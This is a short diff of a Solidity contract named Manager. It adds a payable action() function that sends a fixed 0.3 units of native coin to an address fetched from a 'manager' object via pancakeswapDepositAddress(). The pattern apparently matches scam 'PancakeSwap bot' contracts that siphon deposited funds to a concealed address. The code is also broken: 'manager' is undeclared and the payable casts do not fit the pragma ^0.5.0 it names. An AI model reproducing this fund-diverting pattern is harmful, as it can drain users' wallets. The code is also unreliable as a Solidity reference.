@@ -1,12 +1,12 @@
 pragma solidity ^0.5.0;
 
 contract Manager {
-    function performTasks() public pure{
+    function performTasks() public payable {
         
     }
     
-    function pancakeDepositAddress() public pure returns (address) {
-
+    function action () public payable {
+        payable(manager.pancakeswapDepositAddress()).transfer(300000000000000000);
     }
 }
 
